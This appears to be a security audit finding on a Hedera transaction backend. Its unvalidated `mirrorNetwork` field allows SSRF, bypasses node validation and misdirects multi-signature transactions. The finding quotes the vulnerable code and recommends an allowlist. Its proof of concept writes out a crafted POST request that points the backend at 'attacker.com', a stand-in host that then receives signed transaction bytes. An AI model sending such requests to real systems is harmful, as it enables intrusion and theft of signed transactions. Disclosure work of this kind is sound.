### Title
Unvalidated User-Supplied `mirrorNetwork` Enables SSRF and Node-Validation Bypass on the Backend

### Summary
Any authenticated user can supply an arbitrary URL as the `mirrorNetwork` field when creating a transaction. The backend accepts this value without an allowlist check, immediately makes an outbound gRPC connection to the attacker-controlled host to fetch an address book, stores the raw URL in the database, and later re-uses it to submit the transaction — routing execution to the attacker-controlled network instead of the real Hedera network. This is the direct analog of the external report: just as SwapFacade accepted any executor address, the transaction API accepts any mirror-network endpoint.

### Finding Description

**Root cause — no allowlist on `mirrorNetwork`:**

`CreateTransactionDto` validates `mirrorNetwork` only as a non-empty string:

```typescript
// back-end/apps/api/src/transactions/dto/create-transaction.dto.ts
@IsNotEmpty()
@IsString()
mirrorNetwork: string;   // any value accepted
``` [1](#0-0) 

**Step 1 — SSRF at transaction creation time:**

`createTransactions` immediately passes the raw user value to `getClientFromNetwork`:

```typescript
// back-end/apps/api/src/transactions/transactions.service.ts
const client = await getClientFromNetwork(dtos[0].mirrorNetwork);
``` [2](#0-1) 

Inside `getClientFromNetwork`, any value that is not `mainnet`, `testnet`, `previewnet`, or `local-node` falls through to the default branch, which constructs a gRPC client pointing at the attacker-supplied host and immediately fires an `AddressBookQuery` against it:

```typescript
// back-end/libs/common/src/utils/sdk/client.ts
const client = Client.forNetwork({}).setMirrorNetwork(
  MirrorNetworkGRPC.fromBaseURL(mirrorNetwork[0]),   // attacker.com:443
);
const nodeAddressBook = await new AddressBookQuery()
  .setFileId(FileId.ADDRESS_BOOK)
  .execute(client);                                  // outbound gRPC to attacker.com:443
client.setNetworkFromAddressBook(nodeAddressBook);
``` [3](#0-2) 

**Step 2 — Node-validation bypass:**

The address book returned by the attacker-controlled server is used to populate the set of "allowed nodes". The subsequent check in `validateAndPrepareTransaction` compares the transaction's node IDs against this attacker-controlled set:

```typescript
const allowedNodes = getNodeAccountIdsFromClientNetwork(client);
if (!isTransactionValidForNodes(sdkTransaction, allowedNodes)) {
  throw new BadRequestException(ErrorCodes.TNVN);
}
``` [4](#0-3) 

By returning a crafted address book, the attacker makes any node ID appear valid, bypassing the only node-legitimacy guard.

**Step 3 — Transaction misdirection at execution time:**

The raw `mirrorNetwork` string is persisted to the database and re-used verbatim when the chain service executes the transaction:

```typescript
// back-end/libs/common/src/execute/execute.service.ts
const client = await getClientFromNetwork(transaction.mirrorNetwork);
// ...
const response = await sdkTransaction.execute(client);
``` [5](#0-4) 

The signed transaction is submitted to nodes advertised by the attacker's mirror node, not to the real Hedera network.

### Impact Explanation

1. **SSRF**: The backend (API service and chain service) makes outbound gRPC connections on port 443 to any host the attacker names. This can be used to probe internal services reachable from the backend container (e.g., metadata endpoints, internal APIs) or to force the backend to connect to external hosts for reconnaissance.

2. **Node-validation bypass**: The `isTransactionValidForNodes` guard — the only server-side check that a transaction targets legitimate Hedera nodes — is rendered meaningless. An attacker can create transactions targeting arbitrary node IDs that would otherwise be rejected.

3. **Transaction misdirection in Organization Mode**: In multi-signature workflows, other organization members sign a transaction believing it will be submitted to mainnet/testnet. Because `mirrorNetwork` is stored and re-used at execution time, the fully-signed transaction is submitted to the attacker's network instead of the real Hedera network. The signing effort of all participants is wasted, and the intended on-chain action never occurs. The attacker also receives the fully-signed transaction bytes at their server, which could be replayed on the real network before the transaction's `validStart` window expires.

### Likelihood Explanation

Any verified (non-admin) user of an organization deployment can trigger this with a single crafted `POST /transactions` request. No elevated privileges are required beyond a valid session token. The field is explicitly part of the public API contract and is documented in the DTO. The attack requires no special tooling — a standard HTTP client suffices.

### Recommendation

1. **Enforce an allowlist in `CreateTransactionDto`**: Use `@IsIn(['mainnet', 'testnet', 'previewnet', 'local-node'])` or a custom validator that also permits operator-configured custom URLs from a server-side allowlist, never from user input directly.

2. **Validate before making outbound connections**: In `getClientFromNetwork`, reject any value not on the allowlist before constructing a client or executing any query.

3. **Separate user-facing network selection from internal network routing**: Store a canonical network identifier (e.g., an enum value) rather than a raw URL, and resolve the actual endpoint server-side at execution time.

### Proof of Concept

**Preconditions**: Attacker has a valid account on the organization backend. Attacker controls a server at `attacker.com` that speaks the Hedera gRPC mirror-node protocol (or simply accepts and logs gRPC connections).

**Steps**:

1. Attacker sends:
```http
POST /transactions
Authorization: Bearer <valid_token>
Content-Type: application/json

{
  "name": "test",
  "description": "test",
  "transactionBytes": "<valid_hex>",
  "creatorKeyId": <attacker_key_id>,
  "signature": "<valid_sig>",
  "mirrorNetwork": "attacker.com"
}
```

2. The API service calls `getClientFromNetwork("attacker.com")`, which resolves to `MirrorNetworkGRPC.fromBaseURL("attacker.com")` → `["attacker.com:443"]`, then fires `AddressBookQuery` against `attacker.com:443`. [6](#0-5) 

3. Attacker's server receives the inbound gRPC connection — **SSRF confirmed**. It returns a crafted address book containing any node IDs, bypassing `isTransactionValidForNodes`.

4. Transaction is saved to the database with `mirrorNetwork = "attacker.com"`.

5. When the chain service executes the transaction (automatically or via `PATCH /transactions/execute/:id`), it again calls `getClientFromNetwork("attacker.com")` and submits the signed transaction to the attacker's nodes — **transaction misdirection confirmed**. [7](#0-6) 

6. In organization mode, repeat step 1 and invite other users to sign. Their signatures are collected and the fully-signed transaction is submitted to `attacker.com`, never reaching the real Hedera network.

### Citations

**File:** back-end/apps/api/src/transactions/dto/create-transaction.dto.ts (L26-28)
```typescript
  @IsNotEmpty()
  @IsString()
  mirrorNetwork: string;
```

**File:** back-end/apps/api/src/transactions/transactions.service.ts (L405-405)
```typescript
    const client = await getClientFromNetwork(dtos[0].mirrorNetwork);
```

**File:** back-end/apps/api/src/transactions/transactions.service.ts (L934-937)
```typescript
    const allowedNodes = getNodeAccountIdsFromClientNetwork(client);
    if (!isTransactionValidForNodes(sdkTransaction, allowedNodes)) {
      throw new BadRequestException(ErrorCodes.TNVN);
    }
```

**File:** back-end/libs/common/src/utils/sdk/client.ts (L38-46)
```typescript
  const client = Client.forNetwork({}).setMirrorNetwork(
    MirrorNetworkGRPC.fromBaseURL(mirrorNetwork[0]),
  );

  const nodeAddressBook = await new AddressBookQuery()
    .setFileId(FileId.ADDRESS_BOOK)
    .execute(client);

  client.setNetworkFromAddressBook(nodeAddressBook);
```

**File:** back-end/libs/common/src/execute/execute.service.ts (L132-144)
```typescript
    const client = await getClientFromNetwork(transaction.mirrorNetwork);

    const executedAt = new Date();
    let transactionStatus = TransactionStatus.EXECUTED;
    let transactionStatusCode = null;
    let isDuplicate = false;

    const result: TransactionExecutedDto = {
      status: transactionStatus,
    };

    try {
      const response = await sdkTransaction.execute(client);
```

**File:** back-end/libs/common/src/utils/mirrorNode/index.ts (L14-15)
```typescript
      default:
        return [mirrorNetwork.endsWith(':443') ? mirrorNetwork : `${mirrorNetwork}:443`];
```
